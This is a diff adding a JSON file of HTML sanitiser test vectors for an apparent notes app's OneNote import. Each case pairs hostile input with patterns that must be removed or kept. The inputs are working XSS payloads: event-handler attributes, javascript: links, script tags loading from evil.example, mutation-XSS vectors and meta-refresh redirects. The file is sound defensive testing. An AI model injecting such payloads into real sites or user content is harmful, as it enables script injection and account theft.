@@ -1,0 +1,28 @@
+{
+  "description": "OneNote page sanitising vectors, shared by scripts/check-onenote-import.cjs (electron/onenote-importer.cjs, hast-util-sanitize) and crates/fanotes-host/src/onenote.rs (ammonia). `absent` patterns must not match the cleaned HTML and `present` patterns must; both are case-insensitive regular expressions.",
+  "cases": [
+    { "html": "<svg/onload=alert(1)><path d=\"M0 0L5 5\" stroke-width=\"2\"/></svg>", "absent": ["onload", "alert"], "present": ["<svg", "<path d=\"M0 0L5 5\"", "stroke-width=\"2\""] },
+    { "html": "<p>a<img src=x onerror=alert(1)></p>", "absent": ["onerror", "src="], "present": ["<p>a<img"] },
+    { "html": "<div/onclick=\"x()\">t</div><span\tonmouseover=y>s</span>", "absent": ["onclick", "onmouseover"], "present": ["<div>t</div>", "<span>s</span>"] },
+    { "html": "<script>alert(1)</script><p>after</p>", "absent": ["<script", "alert"], "present": ["<p>after</p>"] },
+    { "html": "<SCRIPT SRC=//evil.example/x.js></SCRIPT>k", "absent": ["script", "evil"], "present": ["k"] },
+    { "html": "<iframe srcdoc=\"<script>alert(1)</script>\"></iframe><object data=x></object><embed src=x>", "absent": ["iframe", "object", "embed", "alert", "srcdoc"], "present": [] },
+    { "html": "<a href=\"javascript:alert(1)\">link</a><a href=\"https://example.com\">web</a>", "absent": ["href", "javascript", "example\\.com"], "present": ["<a>link</a>", "<a>web</a>"] },
+    { "html": "<form action=\"https://evil.example\"><input name=q><button formaction=x>go</button></form><textarea>t</textarea>", "absent": ["<form", "<input", "<button", "action", "evil", "<textarea"], "present": [] },
+    { "html": "<math><mi>x</mi><mo>=</mo><mn>2</mn></math>", "absent": [], "present": ["<math>", "<mi>x</mi>", "<mn>2</mn>"] },
+    { "html": "<svg><a href=\"javascript:alert(1)\"><text>t</text></a><animate attributeName=\"href\" to=\"javascript:alert(1)\"/><set attributeName=onmouseover to=alert(1)></set></svg>", "absent": ["href", "javascript", "animate", "<set", "alert"], "present": ["<svg>", "<text>t</text>"] },
+    { "html": "<svg><foreignObject><img src=x onerror=alert(1)></foreignObject><use href=\"#a\"/><image href=\"https://evil.example/i.png\"/></svg>", "absent": ["onerror", "foreignobject", "<use", "<image", "evil", "href"], "present": ["<svg>"] },
+    { "html": "<svg><style>&lt;/style&gt;&lt;img src=x onerror=alert(1)&gt;</style></svg>", "absent": ["<img"], "present": ["<svg>"] },
+    { "html": "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>", "absent": ["<img src", "<mglyph"], "present": [] },
+    { "html": "<p style=\"color:red\" class=\"outline-element\" id=\"p1\">styled</p>", "absent": [], "present": ["style=\"color:red\"", "class=\"outline-element\"", "id=\"p1\""] },
+    { "html": "<img src=\"data:image/png;base64,iVBORw0KGgo=\" alt=\"bild\"><img src=\"data:text/html;base64,PHNjcmlwdD4=\">", "absent": ["data:text"], "present": ["src=\"data:image/png;base64,iVBORw0KGgo=\"", "alt=\"bild\""] },
+    { "html": "<img data-fanotes-missing-image=\"blocked\" alt=\"x\">", "absent": [], "present": ["data-fanotes-missing-image=\"blocked\""] },
+    { "html": "<table cellspacing=\"0\" border=\"1\"><tr><td colspan=\"2\" style=\"width:10px\">c</td></tr></table>", "absent": [], "present": ["<table cellspacing=\"0\" border=\"1\">", "<td colspan=\"2\" style=\"width:10px\">c</td>"] },
+    { "html": "<html><head><title>T</title><meta http-equiv=\"refresh\" content=\"0;url=https://evil.example\"><base href=\"https://evil.example/\"><link rel=stylesheet href=https://evil.example/x.css></head><body><p>b</p></body></html>", "absent": ["<title", "<meta", "<base", "<link", "evil", "refresh"], "present": ["<p>b</p>"] },
+    { "html": "<style>.a{color:red}</style><p class=a>x</p>", "absent": [], "present": ["<style>\\.a\\{color:red\\}</style>"] },
+    { "html": "<!-- <img src=x onerror=alert(1)> --><p>c</p>", "absent": ["<!--", "onerror"], "present": ["<p>c</p>"] },
+    { "html": "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\"></noscript>", "absent": ["onerror"], "present": [] },
+    { "html": "<template><img src=x onerror=alert(1)></template><p>t</p>", "absent": ["onerror", "template"], "present": ["<p>t</p>"] },
+    { "html": "<div xmlns:x=\"y\" x:onclick=\"alert(1)\" aria-checked=\"true\" role=\"checkbox\">c</div>", "absent": ["onclick", "alert"], "present": ["aria-checked=\"true\"", "role=\"checkbox\""] }
+  ]
+}
